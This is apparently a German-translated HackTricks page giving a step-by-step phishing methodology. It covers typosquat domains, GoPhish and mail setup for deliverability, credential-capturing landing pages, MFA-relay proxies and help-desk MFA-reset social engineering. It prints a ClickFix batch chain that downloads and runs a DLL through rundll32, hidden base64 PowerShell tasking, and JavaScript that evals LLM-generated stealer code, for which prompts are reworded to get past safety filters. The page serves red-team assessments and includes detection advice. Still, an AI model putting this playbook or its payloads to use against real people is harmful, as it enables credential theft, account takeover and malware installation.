# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Wähle die **victim domain**.
2. Führe eine grundlegende Web-Enumeration durch, indem du nach **login portals** suchst, die vom Opfer genutzt werden, und **entscheide**, welches du **impersonate** wirst.
3. Nutze etwas **OSINT**, um **emails** zu **find**.
2. Bereite die Umgebung vor
1. **Kaufe die domain**, die du für die phishing assessment verwenden wirst
2. **Konfiguriere die email service**-bezogenen Records (SPF, DMARC, DKIM, rDNS)
3. Konfiguriere die VPS mit **gophish**
3. Bereite die Kampagne vor
1. Bereite das **email template** vor
2. Bereite die **web page** vor, um die credentials zu stehlen
4. Starte die Kampagne!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Der domain name **enthält** ein wichtiges **keyword** der ursprünglichen domain (z. B. zelster.com-management.com).
- **hypened subdomain**: Ersetze den **dot durch einen hyphen** in einer subdomain (z. B. www-zelster.com).
- **New TLD**: Gleiche domain mit einem **neuen TLD** (z. B. zelster.org)
- **Homoglyph**: Es **ersetzt** einen Buchstaben im domain name durch **Buchstaben, die ähnlich aussehen** (z. B. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Es **vertauscht zwei Buchstaben** innerhalb des domain name (z. B. zelsetr.com).
- **Singularization/Pluralization**: Fügt ein „s“ am Ende des domain name hinzu oder entfernt es (z. B. zeltsers.com).
- **Omission**: Es **entfernt einen** der Buchstaben aus dem domain name (z. B. zelser.com).
- **Repetition:** Es **wiederholt einen** der Buchstaben im domain name (z. B. zeltsser.com).
- **Replacement**: Wie homoglyph, aber weniger stealthy. Es ersetzt einen der Buchstaben im domain name, vielleicht durch einen Buchstaben in Nähe des ursprünglichen Buchstabens auf der Tastatur (z. B. zektser.com).
- **Subdomained**: Füge einen **dot** innerhalb des domain name ein (z. B. ze.lster.com).
- **Insertion**: Es **fügt einen Buchstaben** in den domain name ein (z. B. zerltser.com).
- **Missing dot**: Hänge die TLD an den domain name an. (z. B. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Es gibt eine **Möglichkeit, dass eines von mehreren Bits, die gespeichert sind oder in der Kommunikation übertragen werden, aufgrund verschiedener Faktoren wie solar flares, cosmic rays oder hardware errors automatisch umgedreht wird**.

Wenn dieses Konzept auf **DNS requests** angewendet wird, ist es möglich, dass die **domain, die der DNS server erhält**, nicht dieselbe ist wie die ursprünglich angeforderte domain.

Zum Beispiel kann eine einzelne Bitänderung in der domain "windows.com" sie zu "windnws.com" ändern.

Angreifer können **dies ausnutzen, indem sie mehrere bit-flipping domains registrieren**, die der domain des Opfers ähneln. Ihre Absicht ist es, legitime users auf ihre eigene Infrastruktur umzuleiten.

Für weitere Informationen lies [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Du kannst in [https://www.expireddomains.net/](https://www.expireddomains.net) nach einer expired domain suchen, die du verwenden könntest.\
Um sicherzustellen, dass die expired domain, die du kaufen wirst, **bereits ein gutes SEO** hat, könntest du prüfen, wie sie kategorisiert ist in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Um **mehr** gültige email addresses zu **discover**n oder die **ones you have already discovered** zu **verify**n, kannst du prüfen, ob du die smtp servers des Opfers bruteforcen kannst. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Außerdem vergiss nicht: Wenn die users **any web portal to access their mails** verwenden, kannst du prüfen, ob es für **username brute force** verwundbar ist, und die Schwachstelle falls möglich ausnutzen.

## Configuring GoPhish

### Installation

Du kannst es von [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) herunterladen.

Lade es herunter und entpacke es in `/opt/gophish` und führe `/opt/gophish/gophish` aus\
Dir wird ein Passwort für den admin user auf port 3333 in der Ausgabe angezeigt. Greife daher auf diesen port zu und verwende diese credentials, um das admin password zu ändern. Möglicherweise musst du diesen port zu local tunneln:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguration

**TLS certificate configuration**

Vor diesem Schritt solltest du die Domain **bereits gekauft** haben, die du verwenden wirst, und sie muss auf die **IP des VPS** zeigen, auf dem du **gophish** konfigurierst.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Start installing: `apt-get install postfix`

Then add the domain to the following files:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**

Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`

Now lets test to send an email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

Stoppen Sie die Ausführung von gophish und konfigurieren wir es.\
Ändern Sie `/opt/gophish/config.json` wie folgt (beachten Sie die Verwendung von https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfiguriere den gophish-Dienst**

Um den gophish-Dienst zu erstellen, damit er automatisch gestartet und als Dienst verwaltet werden kann, kannst du die Datei `/etc/init.d/gophish` mit folgendem Inhalt erstellen:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Finish configuring the service and checking it doing:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurieren von Mailserver und Domain

### Wait & be legit

Je älter eine Domain ist, desto geringer ist die Wahrscheinlichkeit, dass sie als Spam erkannt wird. Dann solltest du so lange wie möglich warten (mindestens 1 Woche), bevor du die Phishing-Bewertung durchführst. Außerdem gilt: Wenn du eine Seite zu einem reputationsstarken Sektor einrichtest, ist die erzielte Reputation besser.

Beachte, dass du, selbst wenn du eine Woche warten musst, alles jetzt bereits konfigurieren kannst.

### Configure Reverse DNS (rDNS) record

Setze einen rDNS-(PTR)-Record, der die IP-Adresse der VPS auf den Domainnamen auflöst.

### Sender Policy Framework (SPF) Record

Du musst **einen SPF-Record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein SPF-Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Du kannst [https://www.spfwizard.net/](https://www.spfwizard.net) verwenden, um deine SPF-Policy zu generieren (verwende die IP der VPS-Maschine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Das ist der Inhalt, der in einem TXT-Record innerhalb der Domain gesetzt werden muss:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Du musst **einen DMARC-Record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC-Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Du musst einen neuen DNS-TXT-Record erstellen, der auf den Hostnamen `_dmarc.<domain>` zeigt, mit folgendem Inhalt:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

You must **configure a DKIM for the new domain**. If you don't know what is a DMARC record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> You need to concatenate both B64 values that the DKIM key generates:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

You can do that using [https://www.mail-tester.com/](https://www.mail-tester.com)\
Just access the page and send an email to the address they give you:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Du kannst auch **deine E-Mail-Konfiguration überprüfen**, indem du eine E-Mail an `check-auth@verifier.port25.com` sendest und die **Antwort liest** (dafür musst du Port **25** **öffnen** und die Antwort in der Datei _/var/mail/root_ ansehen, wenn du die E-Mail als root sendest).\
Prüfe, dass du alle Tests bestehst:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Du könntest auch eine **Nachricht an ein Gmail unter deiner Kontrolle** senden und die **Header der E-Mail** in deinem Gmail-Posteingang prüfen; `dkim=pass` sollte im `Authentication-Results`-Headerfeld vorhanden sein.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Entfernen von der Spamhouse-Blacklist

Die Seite [www.mail-tester.com](https://www.mail-tester.com) kann dir anzeigen, ob deine Domain von spamhouse blockiert wird. Du kannst beantragen, dass deine Domain/IP entfernt wird unter: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Entfernen von der Microsoft-Blacklist

​​Du kannst beantragen, dass deine Domain/IP entfernt wird unter [https://sender.office.com/](https://sender.office.com).

## GoPhish-Kampagne erstellen & starten

### Sending Profile

- Setze einen **Namen zur Identifizierung** des Sender-Profils
- Entscheide, von welchem Konto aus du die phishing-E-Mails senden wirst. Vorschläge: _noreply, support, servicedesk, salesforce..._
- Du kannst Benutzername und Passwort leer lassen, aber stelle sicher, dass du **Ignore Certificate Errors** aktivierst

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Es wird empfohlen, die Funktion "**Send Test Email**" zu verwenden, um zu prüfen, ob alles funktioniert.\
> Ich würde empfehlen, die Test-E-Mails an 10min-Mail-Adressen zu senden, um zu vermeiden, dass du bei Tests auf eine Blacklist gesetzt wirst.

### Email Template

- Setze einen **Namen zur Identifizierung** der Vorlage
- Dann schreibe einen **Betreff** (nichts Seltsames, einfach etwas, das du in einer normalen E-Mail erwarten würdest)
- Stelle sicher, dass du "**Add Tracking Image**" aktiviert hast
- Schreibe die **E-Mail-Vorlage** (du kannst Variablen wie im folgenden Beispiel verwenden):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **um die Glaubwürdigkeit der E-Mail zu erhöhen**, wird empfohlen, eine Signatur aus einer E-Mail des Kunden zu verwenden. Vorschläge:

- Sende eine E-Mail an eine **nicht existierende Adresse** und prüfe, ob die Antwort irgendeine Signatur enthält.
- Suche nach **öffentlichen E-Mails** wie info@ex.com oder press@ex.com oder public@ex.com und sende ihnen eine E-Mail und warte auf die Antwort.
- Versuche, eine **gültig entdeckte** E-Mail zu kontaktieren und warte auf die Antwort

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> The Email Template erlaubt es auch, **Dateien zum Senden anzuhängen**. Wenn du außerdem NTLM-Challenges mit einigen speziell präparierten Dateien/Dokumenten stehlen möchtest, [lies diese Seite](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Vergib einen **Namen**
- **Schreibe den HTML-Code** der Webseite. Beachte, dass du Webseiten **importieren** kannst.
- Aktiviere **Capture Submitted Data** und **Capture Passwords**
- Setze eine **Weiterleitung**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalerweise musst du den HTML-Code der Seite anpassen und lokal einige Tests machen (vielleicht mit einem Apache-Server), **bis dir das Ergebnis gefällt.** Danach trägst du diesen HTML-Code in das Feld ein.\
> Beachte, dass du, falls du für das HTML **statische Ressourcen** (vielleicht einige CSS- und JS-Seiten) verwenden musst, diese in _**/opt/gophish/static/endpoint**_ speichern und dann über _**/static/\<filename>**_ darauf zugreifen kannst.

> [!TIP]
> Für die Weiterleitung könntest du die Benutzer zur legitimen Hauptwebseite des Opfers **weiterleiten** oder sie zum Beispiel zu _/static/migration.html_ umleiten, dort für 5 Sekunden ein **Ladesymbol (**[**https://loading.io/**](https://loading.io)**) anzeigen** und dann mitteilen, dass der Vorgang erfolgreich war.

### Users & Groups

- Vergib einen Namen
- **Importiere die Daten** (beachte, dass du für das Beispiel-Template den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Erstelle schließlich eine Campaign, indem du einen Namen, die E-Mail-Vorlage, die Landing Page, die URL, das Sending Profile und die Gruppe auswählst. Beachte, dass die URL der Link ist, der an die Opfer gesendet wird

Beachte, dass das **Sending Profile es erlaubt, eine Test-E-Mail zu senden, um zu sehen, wie die finale Phishing-E-Mail aussehen wird**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Ich würde empfehlen, die **Test-E-Mails an 10min-Mail-Adressen zu senden**, um zu vermeiden, beim Testen auf Blacklists zu landen.

Sobald alles bereit ist, starte einfach die Campaign!

## Website Cloning

Wenn du aus irgendeinem Grund die Website klonen willst, schau dir die folgende Seite an:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In einigen Phishing-Assessments (hauptsächlich für Red Teams) möchtest du möglicherweise auch **Dateien mit einer Art Backdoor senden** (vielleicht ein C2 oder vielleicht nur etwas, das eine Authentifizierung auslöst).\
Sieh dir die folgende Seite für einige Beispiele an:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Der vorherige Angriff ist ziemlich clever, weil du eine echte Webseite vortäuschst und die vom Benutzer eingegebenen Informationen sammelst. Leider wird diese Information, wenn der Benutzer nicht das richtige Passwort eingegeben hat oder wenn die gefälschte Anwendung mit 2FA konfiguriert ist, **nicht ausreichen, um sich als der getäuschte Benutzer auszugeben**.

Hier kommen Tools wie [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) und [**muraena**](https://github.com/muraenateam/muraena) zum Einsatz. Dieses Tool ermöglicht es dir, einen MitM-ähnlichen Angriff zu erzeugen. Im Grunde funktioniert der Angriff auf folgende Weise:

1. Du **imittierst das Login**-Formular der echten Webseite.
2. Der Benutzer **sendet** seine **Anmeldedaten** an deine gefälschte Seite und das Tool sendet diese an die echte Webseite und **prüft, ob die Anmeldedaten funktionieren**.
3. Wenn das Konto mit **2FA** konfiguriert ist, fragt die MitM-Seite danach und sobald der **Benutzer es eingibt**, sendet das Tool es an die echte Webseite.
4. Sobald der Benutzer authentifiziert ist, hast du als Angreifer **die Anmeldedaten, die 2FA, den Cookie und alle Informationen** jeder Interaktion abgefangen, während das Tool einen MitM ausführt.

### Via VNC

Was wäre, wenn du statt den **Opfer zu einer bösartigen Seite** mit dem gleichen Aussehen wie das Original zu schicken, ihn zu einer **VNC-Session mit einem Browser, der mit der echten Webseite verbunden ist**, leitest? Du könntest sehen, was er tut, das Passwort stehlen, die verwendete MFA, die Cookies...\
Das kannst du mit [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) machen

## Detecting the detection

Offensichtlich ist eine der besten Möglichkeiten zu erkennen, ob du aufgeflogen bist, deine **Domain in Blacklists zu suchen**. Wenn sie gelistet ist, wurde deine Domain irgendwie als verdächtig erkannt.\
Eine einfache Möglichkeit zu prüfen, ob deine Domain in einer Blacklist erscheint, ist die Nutzung von [https://malwareworld.com/](https://malwareworld.com)

Es gibt jedoch noch andere Möglichkeiten zu erkennen, ob das Opfer **aktiv nach verdächtiger Phishing-Aktivität im Wild** sucht, wie in folgendem Abschnitt erklärt:


{{#ref}}
detecting-phising.md
{{#endref}}

Du kannst eine Domain mit einem sehr ähnlichen Namen wie die Domain des Opfers **kaufen** und/oder ein Zertifikat für eine **Subdomain** einer von dir kontrollierten Domain **erzeugen**, die das **Schlüsselwort** der Domain des Opfers **enthält**. Wenn das **Opfer** irgendeine Art von **DNS- oder HTTP-Interaktion** mit ihnen durchführt, weißt du, dass es **aktiv nach** verdächtigen Domains sucht, und du musst sehr stealthy vorgehen.

### Evaluate the phishing

Verwende [**Phishious** ](https://github.com/Rices/Phishious), um zu prüfen, ob deine E-Mail im Spam-Ordner landen, blockiert werden oder erfolgreich sein wird.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne Intrusion-Setups überspringen E-Mail-Lures zunehmend vollständig und **zielen direkt auf den Service-Desk- / Identity-Recovery-Workflow** ab, um MFA zu umgehen. Der Angriff ist vollständig "living-off-the-land": Sobald der Operator gültige Zugangsdaten besitzt, pivotiert er mit eingebauten Admin-Tools – Malware ist nicht erforderlich.

### Attack flow
1. Recon the victim
* Sammle persönliche & geschäftliche Details von LinkedIn, Datenleaks, öffentlichem GitHub usw.
* Identifiziere hochsensible Identitäten (Executives, IT, Finance) und ermittle den **genauen Help-Desk-Prozess** für Password- / MFA-Reset.
2. Real-time social engineering
* Rufe den Help-Desk an, benutze Teams oder Chat und gib dich als das Ziel aus (oft mit **gespoofter Caller-ID** oder **geklonter Stimme**).
* Gib die zuvor gesammelten PII an, um wissensbasierte Verifikation zu bestehen.
* Überzeuge den Agenten, das **MFA-Secret zurückzusetzen** oder einen **SIM-Swap** auf einer registrierten Mobilnummer durchzuführen.
3. Immediate post-access actions (≤60 min in real cases)
* Verschaffe dir einen Fuß in der Tür über ein beliebiges Web-SSO-Portal.
* Erkunde AD / AzureAD mit Bordmitteln (keine Binärdateien ablegen):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Laterale Bewegung mit **WMI**, **PsExec** oder legitimen **RMM**-Agents, die bereits in der Umgebung freigegeben sind.

### Detection & Mitigation
* Behandle Help-Desk-Identity-Recovery als **privilegierte Operation** – erfordere Step-up-Auth & Genehmigung durch den Manager.
* Setze **Identity Threat Detection & Response (ITDR)** / **UEBA**-Regeln ein, die auf Folgendes alarmieren:
* MFA-Methode geändert + Authentifizierung von neuem Gerät / neuer Geo.
* Unmittelbare Erhöhung derselben Identität (user-→-admin).
* Zeichne Help-Desk-Anrufe auf und erzwinge einen **Rückruf an eine bereits registrierte Nummer**, bevor ein Reset durchgeführt wird.
* Implementiere **Just-In-Time (JIT) / Privileged Access**, damit neu zurückgesetzte Konten **nicht automatisch** High-Privilege-Tokens erben.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity Crews kompensieren die Kosten von High-Touch-Operationen mit Massenangriffen, die **Suchmaschinen & Werbenetzwerke zum Lieferkanal** machen.

1. **SEO poisoning / malvertising** bringt ein gefälschtes Ergebnis wie `chromium-update[.]site` an die Spitze der Suchanzeigen.
2. Das Opfer lädt einen kleinen **First-Stage-Loader** herunter (oft JS/HTA/ISO). Beispiele, die von Unit 42 gesehen wurden:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Der Loader exfiltriert Browser-Cookies + Credential-DBs und lädt dann einen **Silent Loader**, der – *in realtime* – entscheidet, ob er Folgendes ausrollt:
* RAT (z. B. AsyncRAT, RustDesk)
* ransomware / wiper
* Persistence-Komponente (Registry-Run-Key + Scheduled Task)

### Hardening tips
* Blockiere neu registrierte Domains und erzwinge **Advanced DNS / URL Filtering** auf *search-ads* ebenso wie auf E-Mail.
* Beschränke die Softwareinstallation auf signierte MSI- / Store-Pakete und verbiete die Ausführung von `HTA`, `ISO`, `VBS` per Policy.
* Überwache Child-Prozesse von Browsern, die Installer öffnen:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Suche nach LOLBins, die häufig von First-Stage-Loadern missbraucht werden (z. B. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: geklonte nationale CERT-Benachrichtigung mit einer **Update**-Schaltfläche, die Schritt-für-Schritt-“Fix”-Anweisungen anzeigt. Den Opfern wird gesagt, sie sollen eine Batch-Datei ausführen, die eine DLL herunterlädt und sie über `rundll32` ausführt.
* Typische beobachtete Batch-Kette:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` legt die Payload in `%TEMP%` ab, ein kurzer Sleep verschleiert Netzwerkjitter, dann ruft `rundll32` den exportierten Einstiegspunkt (`notepad`) auf.
* Die DLL beacons host identity und pollt C2 alle paar Minuten. Remote Tasking kommt als **base64-encodiertes PowerShell**, ausgeführt versteckt und mit Policy Bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Das erhält die C2-Flexibilität aufrecht (der Server kann Aufgaben austauschen, ohne die DLL zu aktualisieren) und blendet Konsolenfenster aus. Suche nach PowerShell-Children von `rundll32.exe` mit `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` zusammen.
* Verteidiger können nach HTTP(S)-Callbacks der Form `...page.php?tynor=<COMPUTER>sss<USER>` und 5-Minuten-Polling-Intervallen nach dem DLL-Load suchen.

---

## AI-Enhanced Phishing Operations
Angreifer kombinieren jetzt **LLM- & Voice-Clone-APIs** für vollständig personalisierte Lures und Interaktionen in Echtzeit.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generiere & versende >100 k E-Mails / SMS mit randomisierter Formulierung & Tracking-Links.|
|Generative AI|Erzeuge *einmalige* E-Mails mit Bezug auf öffentliche M&A, Insider-Witze aus Social Media; Deepfake-CEO-Stimme in Rückruf-Betrug.|
|Agentic AI|Registriert autonom Domains, sammelt Open-Source-Intel, erstellt die nächste Mail-Stufe, wenn ein Opfer klickt, aber keine Zugangsdaten sendet.|

**Defence:**
• Füge **dynamische Banner** hinzu, die Nachrichten aus untrusted automation hervorheben (über ARC/DKIM-Anomalien).
• Setze **Voice-Biometric Challenge Phrases** für risikoreiche Telefonanfragen ein.
• Simuliere kontinuierlich AI-generierte Lures in Awareness-Programmen – statische Vorlagen sind obsolet.

Siehe auch – Missbrauch von agentic browsing für credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Siehe auch – AI agent abuse of local CLI tools and MCP (für secrets inventory und detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Angreifer können harmlos aussehendes HTML ausliefern und den **Stealer zur Laufzeit generieren**, indem sie eine **vertrauenswürdige LLM-API** nach JavaScript fragen und dieses dann im Browser ausführen (z. B. `eval` oder dynamisches `<script>`).

1. **Prompt-as-obfuscation:** exfil URLs/Base64-Strings im Prompt kodieren; Formulierungen iterieren, um Safety-Filter zu umgehen und Halluzinationen zu reduzieren.
2. **Client-side API call:** beim Laden ruft JS ein öffentliches LLM (Gemini/DeepSeek/etc.) oder einen CDN-Proxy auf; im statischen HTML ist nur der Prompt/API-Call vorhanden.
3. **Assemble & exec:** die Antwort verketten und ausführen (polymorph pro Besuch):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generierter Code personalisiert den Lure (z. B. LogoKit-Token-Parsing) und sendet creds an den prompt-hidden endpoint.

**Evasion traits**
- Traffic trifft bekannte LLM-Domains oder renommierte CDN-Proxys; manchmal über WebSockets zu einem Backend.
- Kein statisches Payload; bösartiges JS existiert nur nach dem Rendern.
- Nicht-deterministische Generierungen erzeugen **unique** Stealer pro Session.

**Detection ideas**
- Sandboxes mit aktiviertem JS ausführen; **runtime `eval`/dynamic script creation sourced from LLM responses** markieren.
- Front-end POSTs an LLM APIs suchen, direkt gefolgt von `eval`/`Function` auf zurückgegebenem Text.
- Alarm bei nicht freigegebenen LLM-Domains im Client-Traffic plus anschließenden credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Neben klassischem push-bombing erzwingen Operatoren während des Help-Desk-Calls einfach **eine neue MFA-Registrierung**, wodurch das vorhandene Token des Users ungültig wird.  Jeder anschließende Login-Prompt wirkt für das Opfer legitim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Überwache AzureAD/AWS/Okta-Events, bei denen **`deleteMFA` + `addMFA`** **innerhalb von Minuten von derselben IP** auftreten.



## Clipboard Hijacking / Pastejacking

Angreifer können heimlich bösartige Befehle von einer kompromittierten oder typosquatteten Webseite in die Zwischenablage des Opfers kopieren und den Nutzer dann dazu bringen, sie in **Win + R**, **Win + X** oder ein Terminalfenster einzufügen, wodurch beliebiger Code ohne Download oder Anhang ausgeführt wird.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
